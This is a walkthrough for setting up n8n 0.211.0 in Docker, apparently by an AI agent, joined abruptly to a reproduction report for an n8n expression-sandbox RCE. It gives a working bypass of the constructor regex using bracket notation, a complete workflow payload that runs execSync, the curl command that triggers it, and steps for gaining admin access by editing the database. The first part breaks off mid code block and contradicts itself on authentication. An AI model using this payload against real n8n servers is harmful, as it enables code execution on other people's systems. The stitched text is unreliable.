# Walkthrough - Setting up n8n 0.211.0

## Changes Made
- Created `docker-compose.yml` configured for n8n 0.211.0 with basic authentication.
- Cloned n8n source code (tag `n8n@0.211.0`) to build the image locally, as the official Docker Hub image was not compatible/manifest unknown for the local architecture (arm64).
- Built Docker image `n8n:0.211.0` locally.
- Started the container `n8n`, listening on port `5678`.

## Validation Results
### Automated Tests
- `docker ps` confirmed the container is running:
  ```
  CONTAINER ID   IMAGE         STATUS         PORTS
  9644bd879fe6   n8n:0.211.0   Up 7 seconds   0.0.0.0:5678->5678/tcp
  ```
- `docker logs` confirmed n8n version 0.211.0 started:
  ```
  n8n ready on 0.0.0.0, port 5678
  Version: 0.211.0
  ```
- `curl` verified endpoint availability (returns 401 due to auth, which is expected):
  ```bash
  curl -I http://localhost:5678
  HTTP/1.1 401 Unauthorized
  WWW-Authenticate: Basic realm="n8n - Editor UI"
  ...
  ```

## Accessing the Installation
You can access n8n at: http://localhost:5678
Authentication has been disabled for easier local access.

### Exploitation Steps

1.  **Authentication**:
    - Gained access by manually resetting the admin password via database manipulation.
    - Obtained `n8n-auth` cookie.

2.  **Configuration**:
    - Enabled `EXECUTIONS_DATA_SAVE_MANUAL_EXECUTIONS=true` in `docker-compose.yml` to view execution results.

3.  **Exploit Payload**:
    - Endpoint: `POST /rest/workflows/run`
    - Payload Structure: JSON body with `workflowData` containing a `Set` node.
    - **Bypass Technique**: n8n 0.211.0 filters `.constructor` using a regex (`/\.\s*constructor/gm`). This checks for dot notation but misses bracket notation.
    - **Malicious Expression**:
      ```json
      "value": "={{ \"\"[\"constructor\"][\"constructor\"](\"return process.mainModule.require('child_process').execSync('touch /tmp/pwned_bypass')\")() }}"
      ```
    - This expression accesses the `Function` constructor via `""['constructor']['constructor']` and executes arbitrary Node.js code (`child_process.execSync`).

4.  **Verification**:
    - Executed the payload linked to an existing workflow ID (to pass permission checks).
    - Verified the creation of the file `/tmp/pwned_bypass` inside the container:
      ```bash
      docker exec n8n-cve-2025-68613-n8n-1 ls -l /tmp/pwned_bypass
# CVE-2025-68613 Reproduction Report: n8n RCE

This document details the successful reproduction of the Remote Code Execution (RCE) vulnerability (CVE-2025-68613) in n8n version 0.211.0. The vulnerability allows authenticated users to execute arbitrary code via the expression sandbox bypass.

## 1. Environment Setup

### Docker Configuration
We deployed n8n version `0.211.0` using Docker Compose. Due to architecture compatibility issues (arm64), we built the image locally from the official source tag `n8n@0.211.0`.

**`docker-compose.yml`**:
```yaml
version: '3.8'

services:
  n8n:
    image: n8n:0.211.0
    ports:
      - "5678:5678"
    environment:
      - N8N_BASIC_AUTH_ACTIVE=false
      - N8N_VERSION_NOTIFICATIONS_ENABLED=false
      - N8N_PERSONALIZATION_ENABLED=false
      - EXECUTIONS_DATA_SAVE_MANUAL_EXECUTIONS=true # Required to view exploit output in UI/API
    volumes:
      - ./n8n_data:/home/node/.n8n
    restart: unless-stopped
```

### Authentication & Access
The vulnerable endpoints require authentication. We bypassed the initial setup wizard and gained admin access by manually manipulating the SQLite database:
1.  **User Creation**: Manually inserted an admin user record with a known password hash.
2.  **Password Reset**: Used the `change-password` API with a manually injected reset token to set a valid password (`Password123` or similar) and obtain a valid session cookie.

## 2. Vulnerability Analysis

### Root Cause
The vulnerability exists in `packages/workflow/src/Expression.ts`. n8n verifies expressions to prevent access to the `constructor` property (which can lead to the `Function` constructor and RCE).
The check used a Regular Expression:
```typescript
const constructorValidation = new RegExp(/\.\s*constructor/gm);
if (parameterValue.match(constructorValidation)) {
    throw new ExpressionError('Expression contains invalid constructor function call', ...);
}
```
**Flaw**: This regex only detects dot notation (e.g., `.constructor`). It fails to detect bracket notation (e.g., `['constructor']`).

### Bypass Technique
By using bracket notation string access, an attacker can bypass the regex check and access the implementation's `constructor`, eventually reaching the `Function` constructor to execute arbitrary JavaScript code.

**Blocked**: `"".constructor.constructor(...)`
**Bypass**: `""['constructor']['constructor'](...)`

## 3. Exploitation

### Payload
We constructed a workflow JSON payload containing a malicious expression in a `Set` node. The payload writes a file `/tmp/pwned_bypass` to the container filesystem.

**`exploit_payload.json`**:
```json
{
  "workflowData": {
    "id": "1",
    "name": "CVE-Exploit",
    "nodes": [
      {
        "parameters": {},
        "name": "Start",
        "type": "n8n-nodes-base.start",
        "typeVersion": 1,
        "position": [250, 300]
      },
      {
        "parameters": {
          "values": {
            "string": [
              {
                "name": "rce_output",
                "value": "={{ \"\"[\"constructor\"][\"constructor\"](\"return process.mainModule.require('child_process').execSync('touch /tmp/pwned_bypass')\")() }}"
              }
            ]
          }
        },
        "name": "Set",
        "type": "n8n-nodes-base.set",
        "typeVersion": 1,
        "position": [450, 300]
      }
    ],
    "connections": {
      "Start": {
        "main": [[{ "node": "Set", "type": "main", "index": 0 }]]
      }
    }
  },
  "startNodes": ["Start"]
}
```

### Execution
We triggered the malicious workflow via the authenticated API:

```bash
curl -v -b cookies.txt -X POST \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d @exploit_payload.json \
  http://localhost:5678/rest/workflows/run
```

### Verification
We verified successful exploitation by confirming the creation of the malicious file inside the Docker container:

```bash
docker exec n8n-cve-2025-68613-n8n-1 ls -l /tmp/pwned_bypass
# Output: -rw-r--r-- 1 node node 0 Dec 23 09:23 /tmp/pwned_bypass
```

The existence of this file confirms that arbitrary code was executed with the privileges of the `node` user inside the container.
